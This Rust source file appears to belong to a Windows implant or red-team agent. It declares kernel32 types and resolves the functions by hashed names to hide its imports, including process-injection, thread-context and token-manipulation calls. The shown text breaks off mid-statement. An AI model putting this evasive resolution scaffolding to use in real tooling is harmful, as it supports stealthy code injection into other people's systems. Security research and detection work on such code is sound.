use core::{
    ffi::{c_ulong, c_void},
    ptr::{self, null_mut},
};

use crate::{get_instance, libs::ldrapi::ldr_function};

#[repr(C)]
pub struct COORD {
    pub X: i16,
    pub Y: i16,
}

pub type LPTHREAD_START_ROUTINE =
    Option<unsafe extern "system" fn(lpthreadparameter: *mut c_void) -> u32>;

#[repr(C)]
pub struct SecurityAttributes {
    pub n_length: u32,
    pub lp_security_descriptor: *mut c_void,
    pub b_inherit_handle: bool,
}

#[allow(non_camel_case_types)]
pub type LPSECURITY_ATTRIBUTES = *mut SecurityAttributes;

pub type LPCWSTR = *const u16;
pub type LPWSTR = *mut u16;
pub type FARPROC = Option<unsafe extern "system" fn() -> isize>;

#[repr(C)]
pub struct StartupInfoExW {
    pub StartupInfo: StartupInfoW,
    pub lpAttributeList: *mut c_void,
}

#[repr(C)]
pub struct StartupInfoW {
    pub cb: u32,
    pub lp_reserved: *mut u16,
    pub lp_desktop: *mut u16,
    pub lp_title: *mut u16,
    pub dw_x: u32,
    pub dw_y: u32,
    pub dw_x_size: u32,
    pub dw_y_size: u32,
    pub dw_x_count_chars: u32,
    pub dw_y_count_chars: u32,
    pub dw_fill_attribute: u32,
    pub dw_flags: u32,
    pub w_show_window: u16,
    pub cb_reserved2: u16,
    pub lp_reserved2: *mut u8,
    pub h_std_input: *mut c_void,
    pub h_std_output: *mut c_void,
    pub h_std_error: *mut c_void,
}

impl StartupInfoW {
    pub fn new() -> Self {
        StartupInfoW {
            cb: core::mem::size_of::<StartupInfoW>() as u32,
            lp_reserved: ptr::null_mut(),
            lp_desktop: ptr::null_mut(),
            lp_title: ptr::null_mut(),
            dw_x: 0,
            dw_y: 0,
            dw_x_size: 0,
            dw_y_size: 0,
            dw_x_count_chars: 0,
            dw_y_count_chars: 0,
            dw_fill_attribute: 0,
            dw_flags: 0,
            w_show_window: 0,
            cb_reserved2: 0,
            lp_reserved2: ptr::null_mut(),
            h_std_input: ptr::null_mut(),
            h_std_output: ptr::null_mut(),
            h_std_error: ptr::null_mut(),
        }
    }
}

#[repr(C)]
pub struct MemoryBasicInformation {
    pub base_address: *mut c_void,
    pub allocation_base: *mut c_void,
    pub allocation_protect: u32,
    pub partition_id: u16,
    pub region_size: usize,
    pub state: u32,
    pub protect: u32,
    pub _type: u32,
}

#[repr(C)]
pub struct ProcessInformation {
    pub h_process: *mut c_void,
    pub h_thread: *mut c_void,
    pub dw_process_id: u32,
    pub dw_thread_id: u32,
}

impl ProcessInformation {
    pub fn new() -> Self {
        ProcessInformation {
            h_process: ptr::null_mut(),
            h_thread: ptr::null_mut(),
            dw_process_id: 0,
            dw_thread_id: 0,
        }
    }
}

#[repr(C)]
pub struct PROCESSENTRY32W {
    pub dw_size: u32,
    pub cnt_usage: u32,
    pub th32_process_id: u32,
    pub th32_default_heap_id: usize,
    pub th32_module_id: u32,
    pub cnt_threads: u32,
    pub th32_parent_process_id: u32,
    pub pc_pri_class_base: i32,
    pub dw_flags: u32,
    pub sz_exe_file: [u16; 260],
}

#[repr(C)]
pub struct THREADENTRY32 {
    pub dw_size: u32,
    pub cnt_usage: u32,
    pub th32_thread_id: u32,
    pub th32_owner_process_id: u32,
    pub tp_base_pri: i32,
    pub tp_delta_pri: i32,
    pub dw_flags: u32,
}

pub type PeekNamedPipe = unsafe extern "system" fn(
    hNamedPipe: *mut c_void,
    lpBuffer: *mut c_void,
    nBufferSize: u32,
    lpBytesRead: *mut u32,
    lpTotalBytesAvail: *mut u32,
    lpBytesLeftThisMessage: *mut u32,
) -> i32;

pub type ConnectNamedPipe = unsafe extern "system" fn(
    hNamedPipe: *mut c_void,
    lpOverlapped: *mut c_void,
) -> i32;

pub type DisconnectNamedPipe = unsafe extern "system" fn(
    hNamedPipe: *mut c_void,
) -> i32;

pub type CreateProcessW = unsafe extern "system" fn(
    lpApplicationName: LPCWSTR,
    lpCommandLine: LPWSTR,
    lpProcessAttributes: LPSECURITY_ATTRIBUTES,
    lpThreadAttributes: LPSECURITY_ATTRIBUTES,
    bInheritHandles: bool,
    dwCreationFlags: c_ulong,
    lpEnvironment: *mut c_void,
    lpCurrentDirectory: LPCWSTR,
    lpStartupInfo: *mut StartupInfoW,
    lpProcessInformation: *mut ProcessInformation,
) -> bool;

pub type CreateFileW = unsafe extern "system" fn(
    lpFileName: LPCWSTR,
    dwDesiredAccess: u32,
    dwShareMode: u32,
    lpSecurityAttributes: LPSECURITY_ATTRIBUTES,
    dwCreationDisposition: u32,
    dwFlagsAndAttributes: u32,
    hTemplateFile: *mut c_void,
) -> *mut c_void;

pub type WriteFile = unsafe extern "system" fn(
    hFile: *mut c_void,
    lpBuffer: *const c_void,
    nNumberOfBytesToWrite: u32,
    lpNumberOfBytesWritten: *mut u32,
    lpOverlapped: *mut c_void,
) -> bool;

pub type VirtualQuery = unsafe extern "system" fn(
    lpAddress: *const c_void,
    lpbuffer: *mut MemoryBasicInformation,
    dwlength: usize,
) -> bool;

pub type VirtualQueryEx = unsafe extern "system" fn(
    hprocess: *mut c_void,
    lpaddress: *const c_void,
    lpbuffer: *mut MemoryBasicInformation,
    dwlength: usize,
) -> usize;

pub type VirtualAllocEx = unsafe extern "system" fn(
    hprocess: *mut c_void,
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: u32,
    flprotect: u32,
) -> *mut c_void;

pub type WriteProcessMemory = unsafe extern "system" fn(
    hprocess: *mut c_void,
    lpbaseaddress: *const c_void,
    lpbuffer: *const c_void,
    nsize: usize,
    lpnumberofbyteswritten: *mut usize,
) -> bool;

pub type VirtualProtectEx = unsafe extern "system" fn(
    hprocess: *mut c_void,
    lpaddress: *const c_void,
    dwsize: usize,
    flnewprotect: u32,
    lpfloldprotect: *mut u32,
) -> bool;

pub type CloseHandle = unsafe extern "system" fn(hobject: *mut c_void) -> bool;

pub type OpenProcess = unsafe extern "system" fn(
    dwdesiredaccess: u32,
    binherithandle: bool,
    dwprocessid: u32,
) -> *mut c_void;

pub type CreateRemoteThread = unsafe extern "system" fn(
    hprocess: *mut c_void,
    lpthreadattributes: *const SecurityAttributes,
    dwstacksize: usize,
    lpstartaddress: LPTHREAD_START_ROUTINE,
    lpparameter: *const c_void,
    dwcreationflags: u32,
    lpthreadid: *mut u32,
) -> *mut c_void;

pub type QueueUserAPC = unsafe extern "system" fn(
    pfnapc: *const c_void,
    hthread: *mut c_void,
    dwdata: usize,
) -> u32;

pub type CreateToolhelp32Snapshot =
    unsafe extern "system" fn(dwflags: u32, th32processid: u32) -> *mut c_void;

pub type Process32FirstW =
    unsafe extern "system" fn(hsnapshot: *mut c_void, lppe: *mut PROCESSENTRY32W) -> bool;

pub type Process32NextW =
    unsafe extern "system" fn(hsnapshot: *mut c_void, lppe: *mut PROCESSENTRY32W) -> bool;

pub type OpenThread = unsafe extern "system" fn(
    dwdesiredaccess: u32,
    binherithandle: bool,
    dwthreadid: u32,
) -> *mut c_void;

pub type Thread32First =
    unsafe extern "system" fn(hsnapshot: *mut c_void, lpte: *mut THREADENTRY32) -> bool;

pub type Thread32Next =
    unsafe extern "system" fn(hsnapshot: *mut c_void, lpte: *mut THREADENTRY32) -> bool;

pub type ReadProcessMemory = unsafe extern "system" fn(
    hprocess: *mut c_void,
    lpbaseaddress: *const c_void,
    lpbuffer: *mut c_void,
    nsize: usize,
    lpnumberofbytesread: *mut usize,
) -> bool;

pub type GetLastError = unsafe extern "system" fn() -> u32;

pub type VirtualAlloc = unsafe extern "system" fn(
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: u32,
    flprotect: u32,
) -> *mut c_void;

pub type VirtualFree =
    unsafe extern "system" fn(lpaddress: *mut c_void, dwsize: usize, dwfreetype: u32) -> bool;

pub type GetModuleHandleA = unsafe extern "system" fn(lpmodulename: *const u8) -> *mut c_void;

pub type GetProcAddress =
    unsafe extern "system" fn(hmodule: *mut c_void, lpprocname: *const u8) -> FARPROC;

pub type LoadLibraryA = unsafe extern "system" fn(lplibfilename: *const u8) -> *mut c_void;
pub type LoadLibraryW = unsafe extern "system" fn(lplibfilename: *const u16) -> *mut c_void;

pub type VirtualProtect = unsafe extern "system" fn(
    lpaddress: *const c_void,
    dwsize: usize,
    flnewprotect: u32,
    lpfloldprotect: *mut u32,
) -> bool;

pub type ReadFile = unsafe extern "system" fn(
    hfile: *mut c_void,
    lpbuffer: *mut u8,
    nnumberofbytestoread: u32,
    lpnumberofbytesread: *mut u32,
    lpoverlapped: *mut c_void,
) -> bool;

pub type GetFileSize =
    unsafe extern "system" fn(hfile: *mut c_void, lpfilesizehigh: *mut u32) -> u32;

pub type GetTokenInformation = unsafe extern "system" fn(
    token_handle: *mut c_void,
    token_information_class: i32,
    token_information: *mut c_void,
    token_information_length: u32,
    return_length: *mut u32,
) -> bool;

pub type RevertToSelf = unsafe extern "system" fn() -> i32;

pub type OpenProcessToken = unsafe extern "system" fn(
    process_handle: *mut c_void,
    desired_access: u32,
    token_handle: *mut *mut c_void,
) -> bool;

pub type SetThreadToken =
    unsafe extern "system" fn(thread: *mut c_void, token: *mut c_void) -> bool;

pub type CreateMutexA = unsafe extern "system" fn(
    lp_mutex_attributes: *mut c_void,
    b_initial_owner: i32,
    lp_name: *const u8,
) -> *mut c_void;

pub type ReleaseMutex = unsafe extern "system" fn(h_mutex: *mut c_void) -> bool;

pub type WaitForSingleObject =
    unsafe extern "system" fn(h_handle: *mut c_void, dw_milliseconds: u32) -> u32;

pub type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;

pub type CreatePipe = unsafe extern "system" fn(
    hreadpipe: *mut *mut c_void,
    hwritepipe: *mut *mut c_void,
    lppipeattributes: *const SecurityAttributes,
    nsize: u32,
) -> bool;

pub type Sleep = unsafe extern "system" fn(dwmilliseconds: u32);

pub type SetStdHandle = unsafe extern "system" fn(nstdhandle: u32, hhandle: *mut c_void) -> bool;

pub type CopyFileW = unsafe extern "system" fn(
    lpexistingfilename: *const u16,
    lpnewfilename: *const u16,
    bfailifexists: bool,
) -> bool;

pub type FlushFileBuffers = unsafe extern "system" fn(
    hfile: *mut c_void,
)->bool;

pub type DeleteFileW = unsafe extern "system" fn(*const u16) -> bool;

pub type DeleteService = unsafe extern "system" fn(
    hservice: *mut c_void,
) -> bool;

pub type OpenServiceW = unsafe extern "system" fn(
    hscmanager: *mut c_void,
    lpservicename: *const u16,
    dwdesiredaccess: u32,
) -> *mut c_void;

pub type CreateThread = unsafe extern "system" fn(
    lpthreadattributes: *const SecurityAttributes,
    dwstacksize: usize,
    lpstartaddress: LPTHREAD_START_ROUTINE,
    lpparameter: *const c_void,
    dwcreationflags: u32,
    lpthreadid: *mut u32,
) -> *mut c_void;

pub type TerminateThread = unsafe extern "system" fn(
    hthread: *mut c_void,
    dwexitcode: u32,
) -> bool;

pub type GetCurrentThread = unsafe extern "system" fn() -> *mut c_void;
pub type GetCurrentThreadId = unsafe extern "system" fn() -> u32;
pub type GetCurrentProcessId = unsafe extern "system" fn() -> u32;
pub type GetComputerNameA = unsafe extern "system" fn(
    lpbuffer: *mut u8,
    nsize: *mut u32,
) -> i32;
pub type ExitThread = unsafe extern "system" fn() -> *mut c_void;
pub type DuplicateHandle = unsafe extern "system" fn(
    hsourceprocesshandle: *mut c_void,
    hsourcehandle: *mut c_void,
    htargetprocesshandle: *mut c_void,
    lptargethandle: *mut *mut c_void,
    dwdesiredaccess: u32,
    binherithandle: i32,
    dwoptions: u32,
) -> i32;

pub type LocalAlloc = unsafe extern "system" fn(
    uflags: u32,
    ubytes: usize,
) -> *mut c_void;

pub type LocalFree = unsafe extern "system" fn(
    hmem: *mut c_void
) -> *mut c_void;

pub type FormatMessageW = unsafe extern "system" fn(
    dwFlags: u32,
    lpSource: *const c_void,
    dwMessageId: u32,
    dwLanguageId: u32,
    lpBuffer: *mut u16,
    nSize: u32,
    Arguments: *const c_void,
) -> u32;

pub type InitializeProcThreadAttributeList = unsafe extern "system" fn(
    lpattributelist: *mut c_void,
    dwattributecount: u32,
    dwflags: u32,
    lpsize: *mut usize,
) -> bool;

pub type UpdateProcThreadAttribute = unsafe extern "system" fn(
    lpattributelist: *mut c_void,
    dwflags: u32,
    attribute: usize,
    lpvalue: *const c_void,
    cbsize: usize,
    lppreviousvalue: *mut c_void,
    lpreturnsize: *const usize,
) -> bool;

pub type HeapAlloc = unsafe extern "system" fn(
    hheap: *mut c_void,
    dwflags: u32,
    dwbytes: usize,
) -> *mut c_void;

pub type GetProcessHeap = unsafe extern "system" fn() -> *mut c_void;

pub type ResumeThread = unsafe extern "system" fn(hthread: *mut c_void) -> u32;

pub type TerminateProcess = unsafe extern "system" fn(
    hprocess: *mut c_void,
    uexitcode: u32,
) -> bool;

pub type ExitProcess = unsafe extern "system" fn(uexitcode: u32) -> !;

pub type AttachConsole = unsafe extern "system" fn(dwprocessid: u32) -> bool;

pub type WriteConsoleW = unsafe extern "system" fn(
    hconsoleoutput: *mut c_void,
    lpbuffer: *const u16,
    nnumberofcharstowrite: u32,
    lpnumberofcharswritten: *mut u32,
    lpreserved: *const c_void,
) -> bool;

pub type CreatePseudoConsole = unsafe extern "system" fn(
    size: COORD,
    hinput: *mut c_void,
    houtput: *mut c_void,
    dwflags: u32,
    phpc: *mut isize,
) -> i32;

pub type CreateDirectoryW = unsafe extern "system" fn(
    lppathname: *const u16,
    lpsecurityattributes: *const SecurityAttributes,
) -> bool;

pub type SetFileAttributesW = unsafe extern "system" fn(
    lpfilename: *const u16,
    dwfileattributes: u32,
) -> bool;

pub type GetCurrentDirectoryW = unsafe extern "system" fn(
    nbufferlength: u32,
    lpbuffer: *mut u16,
) -> u32;

pub type GetSystemTimeAsFileTime = unsafe extern "system" fn(
    lpSystemTimeAsFileTime: *mut c_void,
);

// x64 CONTEXT structure for thread context manipulation
#[repr(C, align(16))]
pub struct Context64 {
    // Register parameter home addresses
    pub p1_home: u64,
    pub p2_home: u64,
    pub p3_home: u64,
    pub p4_home: u64,
    pub p5_home: u64,
    pub p6_home: u64,

    // Control flags
    pub context_flags: u32,
    pub mx_csr: u32,

    // Segment registers
    pub seg_cs: u16,
    pub seg_ds: u16,
    pub seg_es: u16,
    pub seg_fs: u16,
    pub seg_gs: u16,
    pub seg_ss: u16,

    pub eflags: u32,

    // Debug registers
    pub dr0: u64,
    pub dr1: u64,
    pub dr2: u64,
    pub dr3: u64,
    pub dr6: u64,
    pub dr7: u64,

    // Integer registers
    pub rax: u64,
    pub rcx: u64,
    pub rdx: u64,
    pub rbx: u64,
    pub rsp: u64,
    pub rbp: u64,
    pub rsi: u64,
    pub rdi: u64,
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,

    // Program counter
    pub rip: u64,

    // Floating point state (XSAVE format) - 512 bytes
    pub flt_save: [u8; 512],

    // Vector registers
    pub vector_register: [u128; 26],
    pub vector_control: u64,

    // Special debug control registers
    pub debug_control: u64,
    pub last_branch_to_rip: u64,
    pub last_branch_from_rip: u64,
    pub last_exception_to_rip: u64,
    pub last_exception_from_rip: u64,
}

impl Context64 {
    pub fn new() -> Self {
        unsafe { core::mem::zeroed() }
    }
}

pub type GetThreadContext = unsafe extern "system" fn(
    hthread: *mut c_void,
    lpcontext: *mut Context64,
) -> bool;

pub type SetThreadContext = unsafe extern "system" fn(
    hthread: *mut c_void,
    lpcontext: *const Context64,
) -> bool;

pub struct Kernel32 {
    pub module_base: *mut u8,
    pub peek_named_pipe: PeekNamedPipe,
    pub connect_named_pipe: ConnectNamedPipe,
    pub disconnect_named_pipe: DisconnectNamedPipe,
    pub create_process_w: CreateProcessW,
    pub create_file_w: CreateFileW,
    pub write_file: WriteFile,
    pub virtual_query: VirtualQuery,
    pub virtual_alloc_ex: VirtualAllocEx,
    pub write_process_memory: WriteProcessMemory,
    pub virtual_protect_ex: VirtualProtectEx,
    pub close_handle: CloseHandle,
    pub open_process: OpenProcess,
    pub create_remote_thread: CreateRemoteThread,
    pub queue_user_apc: QueueUserAPC,
    pub create_toolhelp_32_snapshot: CreateToolhelp32Snapshot,
    pub process_32_first: Process32FirstW,
    pub process_32_next: Process32NextW,
    pub read_process_memory: ReadProcessMemory,
    pub get_last_error: GetLastError,
    pub virtual_alloc: VirtualAlloc,
    pub virtual_free: VirtualFree,
    pub get_module_handle_a: GetModuleHandleA,
    pub get_proc_address: GetProcAddress,
    pub load_library_a: LoadLibraryA,
    pub load_library_w: LoadLibraryW,
    pub virtual_protect: VirtualProtect,
    pub read_file: ReadFile,
    pub get_file_size: GetFileSize,
    pub create_mutex_a: CreateMutexA,
    pub release_mutex: ReleaseMutex,
    pub wait_for_single_object: WaitForSingleObject,
    pub get_current_process: GetCurrentProcess,
    pub create_pipe: CreatePipe,
    pub sleep: Sleep,
    pub set_std_handle: SetStdHandle,
    pub copy_file_w: CopyFileW,
    pub flush_file_buffers: FlushFileBuffers,
    pub delete_file_w: DeleteFileW,
    pub delete_service: DeleteService,
    pub open_service_w: OpenServiceW,
    pub create_thread: CreateThread,
    pub terminate_thread: TerminateThread,
    pub get_current_thread: GetCurrentThread,
    pub get_current_thread_id: GetCurrentThreadId,
    pub get_current_process_id: GetCurrentProcessId,
    pub get_computer_name_a: GetComputerNameA,
    pub duplicate_handle: DuplicateHandle,
    pub local_alloc: LocalAlloc,
    pub local_free: LocalFree,
    pub initialize_proc_thread_attribute_list: InitializeProcThreadAttributeList,
    pub update_proc_thread_attribute: UpdateProcThreadAttribute,
    pub heap_alloc: HeapAlloc,
    pub get_process_heap: GetProcessHeap,
    pub resume_thread: ResumeThread,
    pub terminate_process: TerminateProcess,
    pub exit_process: ExitProcess,
    pub create_pseudo_console: CreatePseudoConsole,
    pub create_directory_w: CreateDirectoryW,
    pub set_file_attributes_w: SetFileAttributesW,
    pub get_current_directory_w: GetCurrentDirectoryW,
    pub get_thread_context: GetThreadContext,
    pub set_thread_context: SetThreadContext,
    pub get_system_time_as_file_time: GetSystemTimeAsFileTime,
    pub virtual_query_ex: VirtualQueryEx,
    pub open_thread: OpenThread,
    pub thread_32_first: Thread32First,
    pub thread_32_next: Thread32Next,
    pub format_message_w: FormatMessageW,
}

impl Kernel32 {
    pub fn new() -> Self {
        Kernel32 {
            module_base: null_mut(),
            peek_named_pipe: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            connect_named_pipe: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            disconnect_named_pipe: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_process_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_file_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            write_file: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_query: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_alloc_ex: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            write_process_memory: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_protect_ex: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            close_handle: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            open_process: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_remote_thread: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            queue_user_apc: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_toolhelp_32_snapshot: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            process_32_first: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            process_32_next: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            read_process_memory: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_last_error: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_alloc: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_free: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_module_handle_a: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_proc_address: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            load_library_a: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            load_library_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_protect: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            read_file: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_file_size: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_mutex_a: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            release_mutex: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            wait_for_single_object: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_current_process: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_pipe: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            sleep: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            set_std_handle: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            copy_file_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            flush_file_buffers: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            delete_file_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            delete_service: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            open_service_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_thread: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            terminate_thread: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_current_thread: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_current_thread_id: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_current_process_id: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_computer_name_a: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            duplicate_handle: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            local_alloc: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            local_free: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            initialize_proc_thread_attribute_list: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            update_proc_thread_attribute: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            heap_alloc: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_process_heap: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            resume_thread: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            terminate_process: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            exit_process: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_pseudo_console: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            create_directory_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            set_file_attributes_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_current_directory_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_thread_context: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            set_thread_context: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            get_system_time_as_file_time: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            virtual_query_ex: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            open_thread: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            thread_32_first: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            thread_32_next: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            format_message_w: unsafe { core::mem::transmute(null_mut::<c_void>()) },
        }
    }
}

unsafe impl Sync for Kernel32 {}
unsafe impl Send for Kernel32 {}

pub fn init_kernel32_funcs() {
    unsafe {
        const PEEKNAMEDPIPE_H: usize = 0xd5312e5d;
        const CREATE_PROCESS_W_H: usize = 0xfbaf90cf;

        let instance = get_instance().unwrap();

        //CreateProcessW
        let create_process_w_addr = ldr_function(instance.k32.module_base, CREATE_PROCESS_W_H);
        instance.k32.create_process_w = core::mem::transmute(create_process_w_addr);

        //PeekNamedPipe
        let k_peek_named_pipe_addr = ldr_function(instance.k32.module_base, PEEKNAMEDPIPE_H);
        instance.k32.peek_named_pipe = core::mem::transmute(k_peek_named_pipe_addr);

        let k_connect_named_pipe_addr = ldr_function(instance.k32.module_base, 0x436e4c62);
        instance.k32.connect_named_pipe = core::mem::transmute(k_connect_named_pipe_addr);

        let k_create_file_w_addr = ldr_function(instance.k32.module_base, 0x687d2110);
        instance.k32.create_file_w = core::mem::transmute(k_create_file_w_addr);

        let k_write_file_addr = ldr_function(instance.k32.module_base, 0xf1d207d0);
        instance.k32.write_file = core::mem::transmute(k_write_file_addr);

        let k_virtual_query_addr = ldr_function(instance.k32.module_base, 0xaa21c82);
        instance.k32.virtual_query = core::mem::transmute(k_virtual_query_addr);

        let k_virtual_alloc_ex_addr = ldr_function(instance.k32.module_base, 0x5775bd54);
        instance.k32.virtual_alloc_ex = core::mem::transmute(k_virtual_alloc_ex_addr);

        let k_write_process_memory_addr = ldr_function(instance.k32.module_base, 0xb7930ae8);
        instance.k32.write_process_memory = core::mem::transmute(k_write_process_memory_addr);

        let k_virtual_protect_ex_addr = ldr_function(instance.k32.module_base, 0x5b6b908a);
        instance.k32.virtual_protect_ex = core::mem::transmute(k_virtual_protect_ex_addr);

        let k_close_handle_addr = ldr_function(instance.k32.module_base, 0xfdb928e7);
        instance.k32.close_handle = core::mem::transmute(k_close_handle_addr);

        let k_open_process_addr = ldr_function(instance.k32.module_base, 0x8b21e0b6);
        instance.k32.open_process = core::mem::transmute(k_open_process_addr);

        let k_create_remote_thread_addr = ldr_function(instance.k32.module_base, 0x252b157d);
        instance.k32.create_remote_thread = core::mem::transmute(k_create_remote_thread_addr);

        let k_queue_user_apc_addr = ldr_function(instance.k32.module_base, 0xe5158bdd);
        instance.k32.queue_user_apc = core::mem::transmute(k_queue_user_apc_addr);

        let k_create_toolhelp_32_snapshot_addr = ldr_function(instance.k32.module_base, 0xf37ac035);
        instance.k32.create_toolhelp_32_snapshot =
            core::mem::transmute(k_create_toolhelp_32_snapshot_addr);

        let k_process_32_first_addr = ldr_function(instance.k32.module_base, 0xb06fa1a8);
        instance.k32.process_32_first = core::mem::transmute(k_process_32_first_addr);

        let k_process_32_next_addr = ldr_function(instance.k32.module_base, 0x43f6e75f);
        instance.k32.process_32_next = core::mem::transmute(k_process_32_next_addr);

        let k_read_process_memory_addr = ldr_function(instance.k32.module_base, 0x5c3f8699);
        instance.k32.read_process_memory = core::mem::transmute(k_read_process_memory_addr);

        let k_get_last_error_addr = ldr_function(instance.k32.module_base, 0x8160bdc3);
        instance.k32.get_last_error = core::mem::transmute(k_get_last_error_addr);

        let k_virtual_alloc_addr = ldr_function(instance.k32.module_base, 0x97bc257);
        instance.k32.virtual_alloc = core::mem::transmute(k_virtual_alloc_addr);

        let k_virtual_free_addr = ldr_function(instance.k32.module_base, 0xe144a60e);
        instance.k32.virtual_free = core::mem::transmute(k_virtual_free_addr);

        let k_get_module_handle_a_addr = ldr_function(instance.k32.module_base, 0xd908e1d8);
        instance.k32.get_module_handle_a = core::mem::transmute(k_get_module_handle_a_addr);

        let k_get_proc_address_addr = ldr_function(instance.k32.module_base, 0xdecfc1bf);
        instance.k32.get_proc_address = core::mem::transmute(k_get_proc_address_addr);

        // DisconnectNamedPipe - using GetProcAddress since we have it now
        let k_disconnect_named_pipe_addr = (instance.k32.get_proc_address)(
            instance.k32.module_base as *mut c_void,
            "DisconnectNamedPipe\0".as_bytes().as_ptr(),
        )
        .unwrap();
        instance.k32.disconnect_named_pipe = core::mem::transmute(k_disconnect_named_pipe_addr);

        let k_load_library_a_addr = ldr_function(instance.k32.module_base, 0xb7072fdb);
        instance.k32.load_library_a = core::mem::transmute(k_load_library_a_addr);

        let k_load_library_w_addr = ldr_function(instance.k32.module_base, 0xb7072ff1);
        instance.k32.load_library_w = core::mem::transmute(k_load_library_w_addr);

        let k_virtual_protect_addr = ldr_function(instance.k32.module_base, 0xe857500d);
        instance.k32.virtual_protect = core::mem::transmute(k_virtual_protect_addr);

        let k_read_file_addr = ldr_function(instance.k32.module_base, 0x84d15061);
        instance.k32.read_file = core::mem::transmute(k_read_file_addr);

        let k_get_file_size_addr = ldr_function(instance.k32.module_base, 0x7b813820);
        instance.k32.get_file_size = core::mem::transmute(k_get_file_size_addr);

        let k_create_mutex_a_addr = ldr_function(instance.k32.module_base, 0x8952e8ed);
        instance.k32.create_mutex_a = core::mem::transmute(k_create_mutex_a_addr);

        let k_release_mutex_addr = ldr_function(instance.k32.module_base, 0x29af2fd9);
        instance.k32.release_mutex = core::mem::transmute(k_release_mutex_addr);

        let k_wait_for_single_object_addr = ldr_function(instance.k32.module_base, 0xdf1b3da);
        instance.k32.wait_for_single_object = core::mem::transmute(k_wait_for_single_object_addr);

        let k_get_current_process_addr = ldr_function(instance.k32.module_base, 0x3f025f67);
        instance.k32.get_current_process = core::mem::transmute(k_get_current_process_addr);

        let k_create_pipe_addr = ldr_function(instance.k32.module_base, 0x9694e9e7);
        instance.k32.create_pipe = core::mem::transmute(k_create_pipe_addr);

        let k_sleep_addr = ldr_function(instance.k32.module_base, 0xe07cd7e);
        instance.k32.sleep = core::mem::transmute(k_sleep_addr);

        let k_set_std_handle_addr = ldr_function(instance.k32.module_base, 0xe620bba8);
        instance.k32.set_std_handle = core::mem::transmute(k_set_std_handle_addr);

        let k_copy_file_w_addr = ldr_function(instance.k32.module_base, 0x39e8f317);
        instance.k32.copy_file_w = core::mem::transmute(k_copy_file_w_addr);

        let k_flush_file_buffers_addr = ldr_function(instance.k32.module_base, 0x3f0f36f4);
        instance.k32.flush_file_buffers = core::mem::transmute(k_flush_file_buffers_addr);

        let k_delete_file_w_addr = ldr_function(instance.k32.module_base, 0x99bee22f);
        instance.k32.delete_file_w = core::mem::transmute(k_delete_file_w_addr);

        let k_delete_service_addr = ldr_function(instance.k32.module_base, 0xe4d65009);
        instance.k32.delete_service = core::mem::transmute(k_delete_service_addr);

        let k_open_service_w_addr = ldr_function(instance.k32.module_base, 0xd3c797bf);
